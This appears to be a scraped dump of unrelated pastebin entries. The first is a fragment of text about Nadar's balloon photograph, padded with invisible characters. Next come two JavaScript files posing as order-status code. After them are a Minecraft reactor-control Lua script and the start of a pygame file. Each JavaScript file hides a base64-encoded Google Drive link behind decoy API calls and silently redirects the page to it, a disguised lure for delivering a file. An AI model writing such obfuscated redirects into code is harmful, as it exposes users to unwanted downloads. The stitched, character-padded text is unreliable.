‎f‎t‎)‎,‎ ‎n‎a‎m‎e‎d‎ ‎L‎e‎ ‎G‎é‎a‎n‎t‎ ‎(‎T‎h‎e‎ ‎G‎i‎a‎n‎t‎)‎.‎ ‎F‎o‎r‎ ‎p‎u‎b‎l‎i‎c‎i‎t‎y‎,‎ ‎h‎e‎ ‎r‎e‎c‎r‎e‎a‎t‎e‎d‎ ‎b‎a‎l‎l‎o‎o‎n‎ ‎f‎l‎i‎g‎h‎t‎s‎ ‎i‎n‎ ‎h‎i‎s‎ ‎s‎t‎u‎d‎i‎o‎ ‎w‎i‎t‎h‎ ‎h‎i‎s‎ ‎w‎i‎f‎e‎,‎ ‎E‎r‎n‎e‎s‎t‎i‎n‎e‎,‎ ‎u‎s‎i‎n‎g‎ ‎a‎ ‎r‎i‎g‎g‎e‎d‎-‎u‎p‎ ‎b‎a‎l‎l‎o‎o‎n‎ ‎g‎o‎n‎d‎o‎l‎a‎.‎ ‎T‎h‎i‎s‎ ‎s‎e‎l‎f‎-‎p‎o‎r‎t‎r‎a‎i‎t‎ ‎o‎f‎ ‎N‎a‎d‎a‎r‎ ‎i‎n‎ ‎a‎ ‎b‎a‎l‎l‎o‎o‎n‎ ‎b‎a‎s‎k‎e‎t‎ ‎w‎a‎s‎ ‎t‎a‎k‎e‎n‎ ‎c‎.‎ ‎1‎8‎6‎3‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎N‎a‎d‎a‎r‎;‎ ‎r‎e‎s‎t‎o‎r‎e‎d‎ ‎b‎y‎ ‎A‎d‎a‎m‎ ‎C‎u‎e‎r‎d‎e‎n‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎s‎t‎r‎e‎t‎c‎h‎ ‎m‎y‎ ‎l‎i‎p‎ ‎o‎u‎t‎ ‎a‎n‎d‎ ‎p‎u‎t‎ ‎r‎i‎n‎g‎s‎ ‎o‎n‎ ‎m‎y‎ ‎n‎e‎c‎k‎.‎"
2A5xxdbr,Products.js,WantingTrae,JavaScript,Saturday 5th of April 2025 02:06:06 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/80322/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
AkC5XRL3,Order.js,WantingTrae,JavaScript,Saturday 5th of April 2025 01:50:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46793/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hh14Sxhi,Draconic Control v15.1 [sMAT] [Lua 5.3 / 5.2],neuroticfox,Lua,Saturday 5th of April 2025 01:50:14 PM CDT," :: start ::
 -- Locals & Requirements
	local component = require(""component"")
	local event = require(""event"")
	local term = require(""term"")
	local gpu = component.gpu
	local screen = component.screen
	local unicode= require(""unicode"")
	local reactorOutputMultiplier = 1
	local cutoffTemp = 9005
	local chaosMode = 0
	local tempDrop = 0
	local devMode = 0
	local deviation = 0
	local cVar = ""Do not use Chaos Mode with less than one block of fuel""
	local tArgs = {...}
	local Arg0 = tonumber(tArgs[1])
	local Arg1 = tonumber(tArgs[2])
	local Arg2 = tonumber(tArgs[3])
	local Arg3 = tonumber(tArgs[4])
	local Arg4 = tostring(tArgs[5])
	local Arg5 = tostring(tArgs[6])
	local ratioX, ratioY = screen.getAspectRatio()
	local maxX, maxY = gpu.maxResolution()
	gpu.setResolution(math.min(ratioX*55, maxX), math.min(ratioY*25,maxY))
term.clear()
term.setCursor(0, 0)
os.sleep(0.5)
 -- pArgs
if not Arg0 then 
os.execute(cls)
print(""           Draconic Control 15.1 xMAT"")
print(""           1.12 - 1.16 Compatible-ish"")
print()
print(""dc15 [Mult] [Temp] [Field] [Mode] [fieldOffset]"")
print()
print(""Arguments"")
print()
print(""[Mult]			-	Reactor Output Multiplier"")
print(""1.16 [10]			1.12 [1]"")
print()
print(""[Temp]			-	Desired Reactor Temperature"")
print(""Default [8000]		Range [2500-8000]"")
print()
print(""[Field]			-	Desired Field Strength %"")
print(""Default [15]			Range [0.5-99]"")
print()
print(""[Mode]			-	Set Desired Program Mode"")
print(""Default [1]			Range [1-3]"")
print(""[1-3]			-	GUI, DEV, CLI"")
print()
print()
print()
print(""       Compiled by BrokenSynapse & AwesomeAlec1"")
print()
print(""Thanks to Maurdekye for creating the base of this program:"")
print(""             https://youtu.be/iLvkk41K84E"")
print()
print("" Thanks to AwesomeAlec1 for creating the control script:"")
print(""             https://youtu.be/CLku1ckXpeU"")
print()
print(""  Thanks to MightyPirates for being so gracious as to"")
print(""   let me fix what they broke by never using Lua 5.3"")
print()
print(""   And a very special thanks to ZanBorg for breaking"")
print(""      this script until it doesn't break anymore."")
goto fin
end
 -- sArgs
local reactorOutputMultiplier = Arg0
local idealTemp = Arg1
local idealField = Arg2
local Mode = Arg3
 -- Components
	if not component.isAvailable(""draconic_reactor"") then
		print(""Reactor not connected. Please connect computer to reactor with an Adapter block."")
		os.exit()
	end
	local reactor = component.draconic_reactor
	local info = reactor.getReactorInfo()
	local fluxGates = {}
	for x,y in pairs(component.list(""flux_gate"")) do
		fluxGates[#fluxGates+1] = x
	end
	if #fluxGates < 2 then
		print(""Not enough flux gates connected; please connect inflow and outflow flux gates with Adapter blocks."")
		os.exit()
	end
	local inputFlux = component.proxy(fluxGates[1])
	local outputFlux = component.proxy(fluxGates[2])
	outputFlux.setOverrideEnabled(true)
	inputFlux.setOverrideEnabled(true)
	if not inputFlux or not outputFlux then
		print(""Not enough flux gates connected; please connect inflow and outflow flux gates with Adapter blocks."")
		os.exit()
	end
 -- AutoSet Gates
        reactor.chargeReactor()
        satOne = info.energySaturation
        fieldOne = info.fieldStrength
        inputFlux.setFlowOverride(1.0)
        os.sleep(0.5)
        satTwo = info.energySaturation
        fieldTwo = info.fieldStrength
        inputFlux.setFlowOverride(0.0)
        reactor.stopReactor()
    if satTwo <= satOne or fieldTwo <= fieldOne then
    local oldAddr = inputFlux.address
      inputFlux = component.proxy(outputFlux.address)
      outputFlux = component.proxy(oldAddr)
    end
 -- Functions
function exit_msg(msg)
	term.clear()
	print(msg)
	os.exit()
end
function modifyTemp(offset)
	local newTemp = idealTemp + offset
	if newTemp > 8000 and Mode == 1 then
		newTemp = 8000
	elseif newTemp > 15000 then
		newTemp = 15000
	elseif newTemp < 2000 then
		newTemp = 2000
	end
		idealTemp = newTemp
	end
function modifyField(offset)
	local newField = idealField + offset
	if newField > 99 then
		newField = 99
	elseif newField < 99 and chaosMode == 1 then
		newField = 99
	elseif newField < 1.0 and Mode == 1 or Mode == 3 then
		newField = 1.0
	elseif newField < 0.5 and Mode == 2 then
		newField = 0.5
	end
		idealField = newField
	end
 -- Buttons
	local adj_button_width = 19
	local tempOffsetX = 62
	local tempOffsetY = 2
	local fieldOffsetX = tempOffsetX + adj_button_width + 2
	local fieldOffsetY = 2
	local cutoffField = 0.75
	highest_use = 0.1
	local buttons = {
	startButton={
    x=2,
    y=20,
    width=18,
    height=1,
    text=""Start"",
	textcolor = 0x0000AA,
    action=function()
      if info.status == ""cooling"" or info.status == ""cold"" then
			chaosMode = 0
			idealField = Arg2
			cutoffField = 0.4
			idealTemp = Arg1
			cVar = ""Do not use Chaos Mode with less than one block of fuel""
        reactor.chargeReactor()
      elseif info.status == ""stopping"" then
			chaosMode = 0
			idealField = Arg2
			cutoffField = 0.4
			idealTemp = Arg1
			cVar = ""Do not use Chaos Mode with less than one block of fuel""
        reactor.activateReactor()
      end
    end,
	condition=function() return info.status ~= ""running"" and info.status ~= ""warming_up"" end
  },
  shutdownButton={
    x=2,
    y=20,
    width=18,
    height=1,
    text=""Shutdown"",
	textcolor = 0xAA0000,
    action=function()
    cutoffTemp = 9000
    idealTemp = Arg1
    idealField = Arg2
    cutoffField = 0.4
	chaosMode = 0
	cVar = ""Do not use Chaos Mode with less than one block of fuel""
      state = ""MASD""
      reactor.stopReactor()
    end,
	condition=function() return info.status == ""running"" or info.status == ""warming_up"" end
  },
  chaosMode={
    x=2,
    y=22,
    width=18,
    height=1,
    text="" Chaos Mode"",
	textcolor = 0x800080,
    action=function()
		if chaosMode == 0 then
			chaosMode = 1
			cutoffTemp = 19750
			idealField = 99
			cutoffField = 5
			idealTemp = 55537.78
		elseif chaosMode == 1 then
			chaosMode = 0
			idealField = Arg2
			cutoffField = 0.4
			idealTemp = Arg1
		end
    end,
    condition=function() return Mode == 2 and info.status == ""running"" end
  },
  forceExit={
    x=158,
    y=1,
    width=3,
    height=1,
    text="" X "",
	textcolor = 0xB00000,
    action=function()
		inputFlux.setFlowOverride(250000)
		chaosMode = 0
		idealField = 99
		cutoffField = 0.4
		idealTemp = Arg1
      reactor.stopReactor()
      gpu.setResolution(gpu.maxResolution())
	  event_loop = false
	  os.execute(""cls"")
    end,
--    condition=function() return running or shutting_down end
  },
  Update={
    x=22,
    y=22,
    width=18,
    height=1,
    text=""Update"",
    action=function()
		reactor.stopReactor()
		os.execute(""cd /home; pastebin get -f hh14Sxhi dc15; cls; dc15"")
    end,
	condition=function() return info.status ~= ""running"" and info.status ~= ""warming_up"" end
  },
  switchGates={
    x=2,
    y=22,
    width=18,
    height=1,
    text=""Swap Flux Gates"",
    action=function()
      cutoffTemp = 10500
      local old_addr = inputFlux.address
      inputFlux = component.proxy(outputFlux.address)
      outputFlux = component.proxy(old_addr)
    end,
	condition=function() return info.status == ""cooling"" or info.status == ""cold"" or info.status == ""stopping"" end
  },
  tempMax={
    x=tempOffsetX,
    y=tempOffsetY,
    width=adj_button_width,
    height=1,
    text=""Maximum"",
	textcolor = 0x552222,
    action=function()
    idealTemp = 8000 end
  },
  tempPThousand={
    x=tempOffsetX,
    y=tempOffsetY+2,
    width=adj_button_width,
    height=1,
    text=""+1000"",
	textcolor = 0x552222,
    action=function() modifyTemp(1000) end
  },
  tempPHundred={
    x=tempOffsetX,
    y=tempOffsetY+4,
    width=adj_button_width,
    height=1,
    text=""+100"",
	textcolor = 0x552222,
    action=function() modifyTemp(100) end
  },
  tempPTen={
    x=tempOffsetX,
    y=tempOffsetY+6,
    width=adj_button_width,
    height=1,
    text=""+10"",
	textcolor = 0x552222,
    action=function() modifyTemp(10) end
  },
  tempPOne={
    x=tempOffsetX,
    y=tempOffsetY+8,
    width=adj_button_width,
    height=1,
    text=""+1"",
	textcolor = 0x552222,
    action=function() modifyTemp(1) end
  },
  tempMin={
    x=tempOffsetX,
    y=tempOffsetY+20,
    width=adj_button_width,
    height=1,
    text=""Minimum"",
	textcolor = 0x552222,
    action=function() modifyTemp(-20000) end
  },
  tempMThousand={
    x=tempOffsetX,
    y=tempOffsetY+18,
    width=adj_button_width,
    height=1,
    text=""-1000"",
	textcolor = 0x552222,
    action=function() modifyTemp(-1000) end
  },
  tempMHundred={
    x=tempOffsetX,
    y=tempOffsetY+16,
    width=adj_button_width,
    height=1,
    text=""-100"",
	textcolor = 0x552222,
    action=function() modifyTemp(-100) end
  },
  tempMTen={
    x=tempOffsetX,
    y=tempOffsetY+14,
    width=adj_button_width,
    height=1,
    text=""-10"",
	textcolor = 0x552222,
    action=function() modifyTemp(-10) end
  },
  tempMOne={
    x=tempOffsetX,
    y=tempOffsetY+12,
    width=adj_button_width,
    height=1,
    text=""-1"",
	textcolor = 0x552222,
    action=function() modifyTemp(-1) end
  },
  fieldPTen={
    x=fieldOffsetX,
    y=fieldOffsetY+1,
    width=adj_button_width,
    height=1,
    text=""+10"",
	textcolor = 0x222299,
    action=function() modifyField(10) end
  },
    fieldPOne={
    x=fieldOffsetX,
    y=fieldOffsetY+3,
    width=adj_button_width,
    height=1,
    text=""+1"",
	textcolor = 0x222299,
    action=function() modifyField(1) end
  },
  fieldPTenth={
    x=fieldOffsetX,
    y=fieldOffsetY+5,
    width=adj_button_width,
    height=1,
    text=""+0.1"",
	textcolor = 0x222299,
    action=function() modifyField(0.1) end
  },
    fieldPThou={
    x=fieldOffsetX,
    y=fieldOffsetY+7,
    width=adj_button_width,
    height=1,
    text=""+0.005"",
	textcolor = 0x222299,
    action=function() modifyField(0.005) end
  },
  fieldMTen={
    x=fieldOffsetX,
    y=fieldOffsetY+19,
    width=adj_button_width,
    height=1,
    text=""-10"",
	textcolor = 0x222299,
    action=function() modifyField(-10) end
  },
    fieldMOne={
    x=fieldOffsetX,
    y=fieldOffsetY+17,
    width=adj_button_width,
    height=1,
    text=""-1"",
	textcolor = 0x222299,
    action=function() modifyField(-1) end
  },
  fieldMTenth={
    x=fieldOffsetX,
    y=fieldOffsetY+15,
    width=adj_button_width,
    height=1,
    text=""-0.1"",
	textcolor = 0x222299,
    action=function() modifyField(-0.1) end
   },
     fieldMThou={
    x=fieldOffsetX,
    y=fieldOffsetY+13,
    width=adj_button_width,
    height=1,
    text=""-0.005"",
	textcolor = 0x222299,
    action=function() modifyField(-0.005) end
   }
}
 -- Control Loop
event_loop = true
while event_loop do
:: loopstart ::
		info = reactor.getReactorInfo()
	if not info or info.maxFuelConversion < 0.001 then 
	cutoffTemp = 9000
	idealTemp = Arg1
	chaosMode = 0
	gpu.setBackground(0x000000)
	gpu.setForeground(0xFF0000)
	term.setCursor(55, 1)
	print ""Please verify that your reactor is refueled.""
	term.setCursor(55, 2)
	print ""Please verify the integrity of your reactor.""
	goto start
	gpu.setForeground(0x000000)
	end
	if info.temperature >= 2000 and info.status ~= ""stopping""  then
		reactor.activateReactor()
	end
 -- Chaos Mode Safe Shutdown
	if info.temperature > 18000 and chaosMode == 1 and tempDrop == 0 then
		idealTemp = 16000
		tempDrop = 1
		cVar = ""Cooling For Shutdown""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) < 8 and chaosMode == 1  and tempDrop == 1 then 
		idealTemp = 14000
		tempDrop = 2
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) < 12.5 and chaosMode == 1  and info.maxFuelConversion < 1297 then
		idealTemp = 8000
		idealField = 99
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) < 1.3 and chaosMode == 1  and tempDrop == 2 and info.maxFuelConversion < 5185 then
		idealTemp = 8000
		idealField = 25
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) < 1 and chaosMode == 1  and tempDrop == 2 then
		idealTemp = 8000
		idealField = 25
    end
	local targetShieldPercent = idealField or 15 -- Desired shield strength
	local targetShield = (targetShieldPercent / 100)
-- Reactor equation variables
    local targetTemp50  = math.min((idealTemp / 10000) * 50, 99)
    local coreSat       = info.energySaturation / info.maxEnergySaturation
    local convLVL       = (info.fuelConversion / info.maxFuelConversion * 1.3) - 0.3
 
    -- Calculate the temperature rise resistance for the reactor at the desired temperature.
    local targetTempResist = ((targetTemp50^4) / (100 - targetTemp50))
 
    -- Calculate the temperature rise exponential needed to reach the desired temperature
    local targetTempExpo = -(targetTempResist*convLVL) - 1000*convLVL + targetTempResist
 
    -- Calculate the saturation level needed to produce the required tempRiseExpo
    local term1 = 1334.1-(3*targetTempExpo)
    local term2 = (1200690-(2700*targetTempExpo))^2
    local term3 = ((-1350*targetTempExpo)+(((-4*term1^3+term2)^(1/2))/2)+600345)^(1/3)
    local targetNegCSat = -(term1/(3*term3))-(term3/3)
 
    -- Saturation received from above equation needs to be reformatted to a more useful form
    local targetCoreSat = 1 - (targetNegCSat/99)
    local targetSat = targetCoreSat * info.maxEnergySaturation
 
    -- Calculate the difference between where saturation is and where it needs to be
    local saturationError = info.energySaturation - targetSat
 
    -- Calculate field drain
    local tempDrainFactor = 0
    if info.temperature > 8000 then
      tempDrainFactor = 1 + ((info.temperature-8000)^2 * 0.0000025)
    elseif info.temperature > 2000 then
      tempDrainFactor = 1
    elseif info.temperature > 1000 then
      tempDrainFactor = (info.temperature-1000)/1000
    end
    
    local baseMaxRFt = (info.maxEnergySaturation / 1000) * reactorOutputMultiplier * 1.5
    local fieldDrain = math.min(tempDrainFactor * math.max(0.01, (1-coreSat)) * (baseMaxRFt / 10.923556), 2147000000)
          print(string.format(""Current field drain is %d RF/t"", info.fieldDrainRate))
    local fieldNegPercent = 1 - targetShield
    --local fieldInputRate = fieldDrain / fieldNegPercent
    local fieldStrengthError = (info.maxFieldStrength * targetShield) - info.fieldStrength
    local requiredInput = math.min((info.maxFieldStrength * info.fieldDrainRate) / (info.maxFieldStrength - info.fieldStrength), info.maxFieldStrength - info.fieldStrength)
 --Automations
   if info.status == ""running"" then
    local outputNeeded = math.min(saturationError, (info.maxEnergySaturation/40))-- + info.generationRate
		outputFlux.setFlowOverride(outputNeeded)
		inputFlux.setFlowOverride(math.min(fieldStrengthError + requiredInput, info.maxFieldStrength) - info.fieldDrainRate + 1)
    elseif info.status == ""warming_up"" then
		outputFlux.setFlowOverride(0)
		inputFlux.setFlowOverride(550000000)
    elseif info.status == ""stopping"" then
		outputFlux.setFlowOverride(0)
		inputFlux.setFlowOverride(requiredInput)
    if info.temperature > cutoffTemp then
        print(""Reactor Too Hot, shutting down"")
        reactor.stopReactor()
    end
    if ((info.fieldStrength / info.maxFieldStrength) * 100) < cutoffField then
        print(""Reactor Field Has Failed, Failsafe Activated, Shutting Down"")
        reactor.stopReactor()
    end
    if ((1 - info.fuelConversion / info.maxFuelConversion) * 100) < 0.2 then
        print(""Reactor Fuel Low, Shutting Down"")
		reactor.stopReactor()
    end
   end
	-- Get Temp Rise
		oldTemp = currentTemp or info.temperature
		currentTemp = info.temperature
		oldTempRate = tempChangeRate or currentTemp - oldTemp
		tempChangeRate = currentTemp - oldTemp
		tempAccel = tempChangeRate - oldTempRate
	if tempAccel == 0 then
		tempAccel = 0.001
	end
	-- Get Fuel Use Rate
		oldFuel = currentFuel or (info.maxFuelConversion - info.fuelConversion)
		currentFuel = (info.maxFuelConversion - info.fuelConversion)
		oldUseRate = fuelUseRate or math.max(info.fuelConversionRate*20, 0.1)
		fuelUseRate = math.max(info.fuelConversionRate*20, 0.1)
		fuelAccel = math.max(fuelUseRate - oldUseRate, 0.1)
 -- Fuel Conversion Rate
	if info.fuelConversionRate > 249999 then
		fuelConversionRate = ((info.fuelConversionRate / (info.maxFuelConversion * 1000000)) * 2000)
		fuelMeasure = ""  %%/s""
	elseif info.fuelConversionRate > 999 then
		fuelConversionRate = (info.fuelConversionRate / 1000)
		fuelMeasure = "" ""..(unicode.char(956))..""b/t""
	elseif info.fuelConversionRate > 999999 then
		fuelConversionRate = (info.fuelConversionRate / 1000000)
		fuelMeasure = "" mb/t""
	else
		fuelConversionRate = info.fuelConversionRate
		fuelMeasure = "" nb/t""
	end
--	Get Time Until Cool
    if info.fuelConversionRate > 1 then
        tempDrain = ((info.temperature - 2000) / 0.4)
    else
        tempDrain = 1
    end
 --Burn Stage
	if ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 20 then burnStage = ""H""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 15 then burnStage = ""He""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 10 then burnStage = ""C""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 8 then burnStage = ""Ne""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 5.5 then burnStage = ""O""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 2.5 then burnStage = ""Si""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 1 then burnStage = ""Fe""
	end
 -- Accuracy
	if ((info.fieldStrength / info.maxFieldStrength) * 100) > idealField then
	 deviation = (((info.fieldStrength / info.maxFieldStrength) * 100)) - idealField
	elseif ((info.fieldStrength / info.maxFieldStrength) * 100) < idealField then
	 deviation = idealField - (((info.fieldStrength / info.maxFieldStrength) * 100))
	end
 -- DrawData
	local secondsToExpire = (info.maxFuelConversion - info.fuelConversion) / math.max(info.fuelConversionRate*0.00002, 0.00001)
 -- GUI
	if term.isAvailable() and Mode ~= 3 then
		function modify_eff(offset)
			local eff = ((outputFlux / inputFlux) * 100)
			if eff > 100000 then
			eff = 1
		end
	end
    local left_margin = 2
    local spacing = 1
    local values = {
                ""Draconic Control™  [v15.1 sMAT | hh14Sxhi]"",
                "" "",
                ""┌──────────────────Reactor Statistics────────────────────┐"",
string.format(""│Time Until Refuel:         │  %5.0fd, %2.0fh, %2.0fm, %2.0fs     │"", secondsToExpire/86400, secondsToExpire   /3600 % 24, secondsToExpire/60 % 60, secondsToExpire % 60),
string.format(""│Time Until Cool:           │  %5.0fd, %2.0fh, %2.0fm, %2.0fs     │"", tempDrain/86400, tempDrain   /3600 % 24, tempDrain/60 % 60, tempDrain % 60),
string.format(""│Ideal Field:               │           %8.3f%%        │"", idealField),
string.format(""│Current Field:             │           %8.3f%%        │"", ((info.fieldStrength / info.maxFieldStrength) * 100) + 0.122),
                ""├───────────────────────────┼────────────────────────────┤"",
string.format(""│Fuel Remaining:            │           %7.3f%%         │"", ((1 - info.fuelConversion / info.maxFuelConversion) * 100)),
string.format(""│Fuel Use Rate:             │           %7.3f"" .. fuelMeasure .. ""     │"", fuelConversionRate),
                ""├───────────────────────────┼────────────────────────────┤"",
string.format(""│Temperature                │   %7.1f°c [%8.1f°f]   │"", info.temperature, ((info.temperature * 1.8) + 32)),
string.format(""│Ideal Temperature:         │   %7.1f°c [%8.1f°f]   │"", idealTemp, ((idealTemp * 1.8) + 32)),
                ""├───────────────────────────┼────────────────────────────┤"",
string.format(""│Energy Input:              │   %12.1f RF/t        │"", requiredInput),
string.format(""│Energy Output:             │   %12.1f RF/t        │"", outputFlux.getFlow()),
                ""└───────────────────────────┴────────────────────────────┘"",
                "" "" .. cVar,
                "" ""
}
	local values2 = {
"" "",
"" "",
"" "",
""                                                                                                                          [Reference Table]"",
""                                                                                                             ┌─────────────┬─────────────┬─────────────┐"",
""                                                                                                             │ Temperature │  Remaining  │ Consumption │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    14000    │    93.27    │    91.90    │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    15000    │    59.00    │    123.5    │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    16000    │    36.45    │     161     │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    17000    │    21.40    │     204     │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    18000    │    11.80    │     251     │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    19000    │    03.89    │     303     │"",
""                                                                                                             └─────────────┴─────────────┴─────────────┘"",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
			  ""Eq. Fusion Stage     "" .. burnStage,
string.format(""Max Fuel [nb]:       %4.3f"", (info.maxFuelConversion * 1000000)),
string.format(""Fuel Remaining [nb]: %4.3f"", ((info.maxFuelConversion - info.fuelConversion) * 1000000)),
string.format(""Temperature Rise: %4.3f"", tempAccel),
string.format(""Temp Resist for target temp %d (%d): %.2f"", idealTemp, targetTemp50, targetTempResist),
string.format(""Temp expo for convLVL %.2f: %.2f"", convLVL, targetTempExpo),
string.format(""Saturation needed for zero rise: %d (%3.2f%%)"", targetSat, targetCoreSat*100),
string.format(""Error between current saturation and target saturation: %d\n"", saturationError),
string.format(""Current field drain is %d RF/t"", info.fieldDrainRate),
string.format(""Current temp drain factor for temp %d is %1.2f"", info.temperature, tempDrainFactor),
string.format(""fieldNegPercent is %d"", fieldNegPercent),
string.format(""Required input to counter field drain: %d RF/t\n"", requiredInput),
string.format(""Field Deviation: "" .. unicode.char(8776) .. deviation .. ""%%""),
string.format(""Input Flux Gate:  ["" .. inputFlux.address .. ""] Set To: "" .. inputFlux.getFlow()),
string.format(""Output Flux Gate: ["" .. outputFlux.address .. ""] Set To: "" .. outputFlux.getFlow())
}
term.clear()
    if Mode == 2 and Mode ~= 3 then
	for i, v in ipairs(values2) do
		term.setCursor(left_margin, i * spacing)
		term.write(v)
		end
	end
	if Mode ~= 3 then
	for i, v in ipairs(values) do
		term.setCursor(left_margin, i * spacing)
		term.write(v)
		end
	end
 -- Draw Buttons
 
		term.setCursor(tempOffsetX, tempOffsetY+10)
		term.write(""Reactor Temperature"")
		term.setCursor(fieldOffsetX+1, fieldOffsetY+10)
		term.write(""  Field Strength"")
		gpu.setForeground(0xFFFFFF)
	for bname, button in pairs(buttons) do
		gpu.setForeground(0x000000)
		if button.depressed then
			button.depressed = button.depressed - 1
			if button.depressed == 0 then
				button.depressed = nil
			end
		end
	if button.condition == nil or button.condition() then
		local centerColor = 0xBBBBBB
		local highlightColor = 0xCCCCCC
		local lowlightColor = 0x808080
	if button.depressed then
		centerColor = 0xAAAAAA
		highlightColor = 0x707070
		lowlightColor = 0xBBBBBB
	end
		gpu.setBackground(centerColor)
        gpu.fill(button.x, button.y, button.width, button.height, "" "")
	if button.width > 1 and button.height > 1 then
		gpu.setBackground(lowlightColor)
		gpu.fill(button.x+1, button.y+button.height-1, button.width-1, 1, "" "")
		gpu.fill(button.x+button.width-1, button.y, 1, button.height, "" "")
		gpu.setBackground(highlightColor)
		gpu.fill(button.x, button.y, 1, button.height, "" "")
		gpu.fill(button.x, button.y, button.width, 1, "" "")
	end
        gpu.setBackground(centerColor)
	if button.textcolor then gpu.setForeground(button.textcolor) end
        term.setCursor(button.x + math.floor(button.width / 2 - #button.text / 2), button.y + math.floor(button.height / 2))
        term.write(button.text)
	end
    end
    gpu.setBackground(0x777777)
    gpu.setForeground(0x000000)
	end
	if term.isAvailable() and Mode == 3 then
	local left_margin = 2
    local spacing = 1
	local values3 = {
""Eq. Fusion Stage     "" .. burnStage,
string.format(""Max Fuel [nb]:       %4.3f"", (info.maxFuelConversion * 1000000)),
string.format(""Fuel Remaining [nb]: %4.3f"", ((info.maxFuelConversion - info.fuelConversion) * 1000000)),
string.format(""Temperature Rise: %4.3f"", tempAccel),
string.format(""Temp Resist for target temp %d (%d): %.2f"", idealTemp, targetTemp50, targetTempResist),
string.format(""Temp expo for convLVL %.2f: %.2f"", convLVL, targetTempExpo),
string.format(""Saturation needed for zero rise: %d (%3.2f%%)"", targetSat, targetCoreSat*100),
string.format(""Error between current saturation and target saturation: %d\n"", saturationError),
string.format(""Current field drain is %d RF/t"", info.fieldDrainRate),
string.format(""Current temp drain factor for temp %d is %1.2f"", info.temperature, tempDrainFactor),
string.format(""fieldNegPercent is %d"", fieldNegPercent),
string.format(""Required input to counter field drain: %d RF/t\n"", requiredInput),
string.format(""Field Deviation: "" .. unicode.char(8776) .. deviation .. ""%%""),
string.format(""Input Flux Gate:  ["" .. inputFlux.address .. ""] Set To: "" .. inputFlux.getFlow()),
string.format(""Output Flux Gate: ["" .. outputFlux.address .. ""] Set To: "" .. outputFlux.getFlow())
}
 for i, v in ipairs(values3) do
 term.setCursor(left_margin, i * spacing)
 term.write(v)
 end
end
 -- Wait for next tick, or manual shutdown
	local event, id, op1, op2 = event.pull(0.01)
	if event == ""interrupted"" then
		if safe then
		break
		end
	elseif event == ""touch"" then
 -- Handle Button Presses
		local x = op1
		local y = op2
		for bname, button in pairs(buttons) do
			if (button.condition == nil or button.condition()) and x >= button.x and x <= button.x + button.width and y >= button.y and y <= button.y + button.height then
				button.action()
				button.depressed = 3
			end
		end
	end
	os.sleep()
		if info.fuelConversionRate == 0 and chaosMode == 1 then
		reactor.stopReactor()
		cutoffTemp = 9001
		idealTemp = 8000
		chaosMode = 0
    end
end
:: fin ::"
AZEP1kan,Untitled,ateyevtm,Python,Saturday 5th of April 2025 01:46:04 PM CDT,"import pygame
import random

pygame.init()

#Константы
